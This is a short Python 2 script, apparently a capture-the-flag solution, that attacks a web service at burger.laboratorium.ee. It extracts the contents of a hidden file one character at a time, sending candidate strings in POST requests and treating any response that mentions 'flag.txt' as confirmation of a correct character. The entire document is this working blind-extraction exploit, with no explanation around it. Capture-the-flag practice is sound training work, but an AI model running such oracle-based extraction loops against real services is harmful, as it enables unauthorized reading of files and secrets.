#!/usr/bin/python
# coding: utf-8
# made by ch4n3@Demon

from requests import post
import string

abc = string.digits + '_' + string.ascii_lowercase
url = 'http://burger.laboratorium.ee:8004/'

file_content = ""
i = 0

while True:
    i += 1

    for character in abc:
        query = file_content + character
        data = {'query': query}

        print i, query

        content = post(url, data=data).content

        # flag.txt exist
        if content.find('flag.txt') > -1:
            file_content = file_content + character

            break

    if i != len(file_content):
        i -= 1      # Subtract 2 to next count
        break

while True:
    i += 1

    for character in abc:
        query = character + file_content
        data = {'query': query}

        print i, query

        content = post(url, data=data).content

        # flag.txt exist
        if content.find('flag.txt') > -1:
            file_content = character + file_content

            break

    if i != len(file_content):
        break

print "\n\nflag.txt content : "
print "\t",
print file_content